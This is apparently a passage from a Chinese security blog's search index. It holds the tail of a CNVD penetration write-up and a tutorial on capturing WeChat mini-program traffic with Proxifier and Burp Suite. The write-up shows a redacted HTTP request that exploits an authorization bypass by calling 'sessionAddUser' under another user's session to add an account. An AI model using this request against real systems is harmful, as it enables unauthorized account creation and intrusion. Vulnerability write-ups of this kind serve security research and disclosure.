src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552712988.png" alt="1717552712988"></p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717553182331.png" alt="1717553182331"></p><p>越权</p><p>&#96;POST xxxxxxxxx        HTTP&#x2F;1.1<br>Host: xxxxx<br>Content-Length: 180<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;125.0.0.0 Safari&#x2F;537.36<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Origin: xxxxxxxxxxxxxxxxxxxx<br>Referer: xxxxxxxxxxxxxxxx<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close</p><p>{“jsonrpc”:”2.0”,”method”:”call”,”params”:[“635F7A20A38A4072899C14B3535CFBF5”,”admin”,”sessionAddUser”,{“username”:”123456”,”password”:”554e36b4db2bc61b606ca16e756b1f7d”}],”id”:11}&#96;</p><p>这里将admin，换成任意用户即可添加成功</p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717553127082.png" alt="1717553127082"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNVD </tag>
            
            <tag> 越权 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序抓包详细教程</title>
      <link href="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/"/>
      <url>/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>前言：关于小程序抓包一直想写出一个比较详细的教程</p><p>实验设备：</p><p>​微信: <a href="https://windows.weixin.qq.com/?lang=zh_CN">https://windows.weixin.qq.com/?lang=zh_CN</a></p><p>​Proxifier：<a href="https://www.proxifier.com/download/">https://www.proxifier.com/download/</a>   (需要挂梯子访问下载)</p><p>​burpsuite：<a href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a> (这里链接的是社区版的，破解版可以去吾爱下载)</p><p>上续操作都完成</p><p>1.打开proxifier portable -&gt;profile -&gt; proxy servers-&gt;add  -&gt;添加本地的端口和ip，选择https</p><p>2.打开proxifier portable -&gt;profile -&gt;proxification rules   -&gt;这里需要配置一些规则</p><p><img src="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%851.png" alt="小程序抓包1">)</p><p>3.设置-&gt;网络和internet-&gt;手动设置代理-&gt;编辑-&gt;将burp的代理端口配置上去（这里默认你的burp已经装好，证书已经导到浏览器）</p><p>4.burp设置 (正常配置即可)</p><p>实例演示：</p><p>微信打开小米汽车的小程序</p><p>在登录的同时抓包，正常抓包</p><hr><p><img src="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%852.png" alt="小程序抓包2"></p><p>原理：proxifier portable代理了本机全部流量，用规则只保留微信和小程序的流量，按正常配置可以抓到本机任意流量，将流量导入burp,由burp来控制流量</p><p>自己试试看，你也能做到~~~</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一个博客发表啦</title>
      <link href="/2024/06/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/06/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>今天是2024年6月2日，终于整好了这个博客，太开心了。会在上面记录自己一年的点点滴滴，一年的时间我会成为什么样子呢？应该会成为一个挖掘src的小case吧，再就是一个什么也不会的安服。</p><p>加油~</p>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 成长 </tag>
            
            <tag> 反省 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
